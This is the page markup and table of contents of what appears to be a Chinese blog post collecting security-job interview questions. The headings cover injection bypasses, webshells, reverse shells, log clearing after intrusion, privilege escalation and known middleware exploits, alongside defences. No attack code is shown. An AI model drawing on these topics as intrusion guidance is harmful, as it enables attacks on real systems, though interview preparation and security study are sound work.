<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="cookie 和 session 的区别cookie 和 session 都是客户端与服务器之间保持状态的解决方案。1）存储的位置不同cookie 存放在客户端，session 存放在服务端。session 存储的数据比较安全 2）存储的数据类型不同两者都是 key-value 的结构，但针对 value 的类型是有差异的：cookie：value 只能是字符串类型，session：value 是">
<meta property="og:type" content="article">
<meta property="og:title" content="【工作】面试题整理 常见问题">
<meta property="og:url" content="https://godreams.cn/2024/03/03/work/workpre2/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="cookie 和 session 的区别cookie 和 session 都是客户端与服务器之间保持状态的解决方案。1）存储的位置不同cookie 存放在客户端，session 存放在服务端。session 存储的数据比较安全 2）存储的数据类型不同两者都是 key-value 的结构，但针对 value 的类型是有差异的：cookie：value 只能是字符串类型，session：value 是">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-03-03T12:15:58.000Z">
<meta property="article:modified_time" content="2025-03-11T07:38:42.482Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="null">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【工作】面试题整理 常见问题</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/03/03/work/workpre1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/03/work/workpre2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/03/work/workpre2/&text=【工作】面试题整理 常见问题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/03/work/workpre2/&is_video=false&description=【工作】面试题整理 常见问题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【工作】面试题整理 常见问题&body=Check out this article: https://godreams.cn/2024/03/03/work/workpre2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/03/work/workpre2/&name=【工作】面试题整理 常见问题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/03/work/workpre2/&t=【工作】面试题整理 常见问题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie-%E5%92%8C-session-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.</span> <span class="toc-text">cookie 和 session 的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GET-%E5%92%8C-POST-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.</span> <span class="toc-text">GET 和 POST 的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSI-%E7%9A%84%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">3.</span> <span class="toc-text">OSI 的七层模型都有哪些</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E4%B8%BE%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">条件竞争漏洞原理与举例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E6%94%BB%E5%87%BB%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E9%98%B2%E6%8A%A4"><span class="toc-number">5.</span> <span class="toc-text">XSS 攻击如何进行防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83-CSRF-%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text">应该如何防范 CSRF 攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%AA%81%E7%A0%B4%E6%B3%A8%E5%85%A5%E6%97%B6%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="toc-number">7.</span> <span class="toc-text">如何突破注入时字符被转义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8PHP%E3%80%81Java%E5%92%8CPython%E4%B8%AD%EF%BC%8C%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E3%80%81%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8C%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">8.1.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-number">8.2.</span> <span class="toc-text">Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">8.3.</span> <span class="toc-text">Python</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%80%8E%E4%B9%88%E7%9B%B2%E6%B3%A8"><span class="toc-number">9.</span> <span class="toc-text">盲注是什么，怎么盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="toc-number">10.</span> <span class="toc-text">宽字节注入产生原理以及根本原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-%E7%9A%84%E7%BD%91%E7%AB%99%E6%B3%A8%E5%85%A5-5-0-%E4%BB%A5%E4%B8%8A%E5%92%8C-5-0-%E4%BB%A5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="toc-number">11.</span> <span class="toc-text">mysql 的网站注入 5.0 以上和 5.0 以下有什么区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95"><span class="toc-number">12.</span> <span class="toc-text">SSRF 漏洞的验证方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">SSRF 漏洞的成因、防御、绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">14.</span> <span class="toc-text">导致文件包含的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-1"><span class="toc-number">14.0.1.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSP-Servlet"><span class="toc-number">14.0.2.</span> <span class="toc-text">JSP&#x2F;Servlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ASP"><span class="toc-number">14.0.3.</span> <span class="toc-text">ASP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">15.</span> <span class="toc-text">文件上传漏洞绕过方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">16.</span> <span class="toc-text">文件上传防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">17.</span> <span class="toc-text">Sqlmap常用参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">18.</span> <span class="toc-text">XXE 漏洞原理与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">18.0.1.</span> <span class="toc-text">1. 文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">18.0.2.</span> <span class="toc-text">2. 内网探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DoS%EF%BC%89"><span class="toc-number">18.0.3.</span> <span class="toc-text">3. 拒绝服务攻击（DoS）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">18.1.</span> <span class="toc-text">防御措施</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%A6%81%E7%94%A8DTD"><span class="toc-number">18.1.1.</span> <span class="toc-text">1. 禁用DTD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%A6%81%E6%AD%A2%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E8%A7%A3%E6%9E%90"><span class="toc-number">18.1.2.</span> <span class="toc-text">2. 禁止外部实体解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%80%9A%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4%E7%94%A8%E6%88%B7%E6%8F%90%E4%BA%A4%E7%9A%84XML%E6%95%B0%E6%8D%AE"><span class="toc-number">18.1.3.</span> <span class="toc-text">3. 通过黑名单过滤用户提交的XML数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">19.</span> <span class="toc-text">任意文件下载漏洞的修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-%E6%94%BB%E5%87%BB%E5%92%8C-XSS-%E6%94%BB%E5%87%BB%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="toc-number">20.</span> <span class="toc-text">CSRF 攻击和 XSS 攻击有什么区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0-demo-jsp-uid-110-%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E4%BD%A0%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF%E8%8E%B7%E5%8F%96-webshell%EF%BC%8C%E5%93%AA%E7%A7%8D%E6%98%AF%E4%BC%98%E9%80%89"><span class="toc-number">21.</span> <span class="toc-text">发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-MySQL-JSP%EF%BC%9A%E5%86%99%E5%85%A5-WebShell"><span class="toc-number">21.1.</span> <span class="toc-text">(1) MySQL+JSP：写入 WebShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MySQL-Tomcat%EF%BC%9A%E5%86%99%E5%85%A5-WAR-WebShell"><span class="toc-number">21.2.</span> <span class="toc-text">(2) MySQL+Tomcat：写入 WAR WebShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%80%9A%E8%BF%87-Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Getshell"><span class="toc-number">21.3.</span> <span class="toc-text">5. 通过 Java 反序列化漏洞 Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Java-WebShell-%E6%8C%81%E4%B9%85%E5%8C%96%E6%96%B9%E5%BC%8F"><span class="toc-number">21.4.</span> <span class="toc-text">6. Java WebShell 持久化方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%87%BA%E8%87%B3%E5%B0%91%E4%B8%89%E7%A7%8D%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">22.</span> <span class="toc-text">说出至少三种业务逻辑漏洞，以及修复方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-%E6%80%8E%E4%B9%88%E5%AF%B9%E4%B8%80%E4%B8%AA%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B3%A8%E5%85%A5"><span class="toc-number">23.</span> <span class="toc-text">sqlmap 怎么对一个注入点注入**</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="toc-number">24.</span> <span class="toc-text">延时注入如何来判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OWASP-%E6%BC%8F%E6%B4%9E%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">25.</span> <span class="toc-text">OWASP 漏洞都有哪些**</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E9%87%8C%E9%9D%A2%E5%8F%AA%E6%9C%89-update-%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8"><span class="toc-number">26.</span> <span class="toc-text">SQL 里面只有 update 怎么利用**</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%A7%A3%EF%BC%9A"><span class="toc-number">26.1.</span> <span class="toc-text">讲解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-%E5%9E%8B%E5%92%8C-XSS-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%88%96%E4%BA%BA%E5%B7%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">27.</span> <span class="toc-text">DOM 型和 XSS 自动化测试或人工测试**</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E-XSS-%E6%80%8E%E4%B9%88%E4%BF%AE%E8%A1%A5%E5%BB%BA%E8%AE%AE"><span class="toc-number">28.</span> <span class="toc-text">对于 XSS 怎么修补建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">29.</span> <span class="toc-text">CSRF 的防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#token-%E5%92%8C-referer-%E5%81%9A%E6%A8%AA%E5%90%91%E5%AF%B9%E6%AF%94%EF%BC%8C%E8%B0%81%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E9%AB%98"><span class="toc-number">30.</span> <span class="toc-text">token 和 referer 做横向对比，谁安全等级高</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9-referer-%E7%9A%84%E9%AA%8C%E8%AF%81%EF%BC%8C%E4%BB%8E%E4%BB%80%E4%B9%88%E8%A7%92%E5%BA%A6%E5%8E%BB%E5%81%9A%EF%BC%9F%E5%A6%82%E6%9E%9C%E5%81%9A%EF%BC%8C%E6%80%8E%E4%B9%88%E6%9D%9C%E7%BB%9D%E9%97%AE%E9%A2%98"><span class="toc-number">31.</span> <span class="toc-text">对 referer 的验证，从什么角度去做？如果做，怎么杜绝问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-token-%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BD%A0%E4%BC%9A%E5%AF%B9-token-%E7%9A%84%E5%93%AA%E6%96%B9%E9%9D%A2%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="toc-number">32.</span> <span class="toc-text">针对 token 攻击，你会对 token 的哪方面进行测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0%E4%BD%A0%E7%9F%A5%E9%81%93%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">33.</span> <span class="toc-text">简述你知道的一句话木马**</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E6%B8%97%E9%80%8F%E6%97%B6%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E4%BA%86-21-80-445-3306-11211-%E7%AB%AF%E5%8F%A3%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">34.</span> <span class="toc-text">假设渗透时发现服务器开了 21, 80, 445, 3306, 11211 端口，你有什么渗透思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E6%B8%97%E9%80%8F%E6%97%B6%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E6%94%BE%E4%BA%86-22%E3%80%818088%E3%80%818161%E3%80%816379-%E7%AB%AF%E5%8F%A3%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">35.</span> <span class="toc-text">假设渗透时发现服务器开放了 22、8088、8161、6379 端口，你有什么渗透思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">36.</span> <span class="toc-text">渗透测试流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5-Linux-%E5%90%8E%E9%9C%80%E8%A6%81%E6%B8%85%E9%99%A4%E5%93%AA%E4%BA%9B%E6%97%A5%E5%BF%97"><span class="toc-number">37.</span> <span class="toc-text">入侵 Linux 后需要清除哪些日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">38.</span> <span class="toc-text">域内横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E3%80%81linux-%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">39.</span> <span class="toc-text">Windows、linux 反弹 shell 的方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%90%9C%E9%9B%86%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">40.</span> <span class="toc-text">子域名搜集的方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oneforall-%E6%90%9C%E7%B4%A2%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">41.</span> <span class="toc-text">Oneforall 搜索的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AA%E5%BE%85%E6%A3%80%E6%B5%8B%E7%9A%84%E7%AB%99%EF%BC%8C%E4%BD%A0%E8%A7%89%E5%BE%97%E5%BA%94%E8%AF%A5%E5%85%88%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">42.</span> <span class="toc-text">拿到一个待检测的站，你觉得应该先做什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="toc-number">43.</span> <span class="toc-text">渗透测试中常见的端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E3%80%81%E7%AE%80%E8%BF%B0-nmap-%E5%8F%82%E6%95%B0%E5%92%8C%E4%B8%8D%E5%90%8C%E6%96%B9%E6%B3%95%E6%89%AB%E6%8F%8F%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">44.</span> <span class="toc-text">12、简述 nmap 参数和不同方法扫描的优缺点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0-Windows-%E5%8F%8A-linux-%E5%B9%B3%E5%8F%B0%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="toc-number">45.</span> <span class="toc-text">简述 Windows 及 linux 平台提权方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0-linux-%E7%B3%BB%E7%BB%9F%E4%B8%AD%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E6%96%B9%E6%B3%95"><span class="toc-number">46.</span> <span class="toc-text">简述 linux 系统中查询日志方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0%E4%B8%80%E4%B8%8B-DeDecms-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">47.</span> <span class="toc-text">描述一下 DeDecms 任意密码重置漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8"><span class="toc-number">48.</span> <span class="toc-text">常见的网站服务器容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B-iis-%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E"><span class="toc-number">49.</span> <span class="toc-text">如何检测 iis 短文件名漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E5%88%AB-web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF-windows-%E8%BF%98%E6%98%AF-linux"><span class="toc-number">50.</span> <span class="toc-text">如何判别 web 服务器是 windows 还是 linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">51.</span> <span class="toc-text">Tomcat 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81"><span class="toc-number">52.</span> <span class="toc-text">Weblogic 后台默认密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-%E7%9A%84-CVE-2019-2725-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">53.</span> <span class="toc-text">Weblogic 的 CVE-2019-2725 漏洞描述与修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E7%8E%B0-weblogic-%E7%88%86%E5%8F%91-0day-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E9%9C%80%E8%A6%81%E4%BD%A0%E7%B4%A7%E6%80%A5%E6%8E%92%E6%9F%A5%E5%BD%B1%E5%93%8D%EF%BC%8C%E8%AF%B4%E8%AF%B4%E4%BD%A0%E7%9A%84%E7%9C%8B%E6%B3%95%EF%BC%9F"><span class="toc-number">54.</span> <span class="toc-text">假设现 weblogic 爆发 0day 漏洞，需要你紧急排查影响，说说你的看法？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">55.</span> <span class="toc-text">常见中间件的配置文件路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">56.</span> <span class="toc-text">Struts2 反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 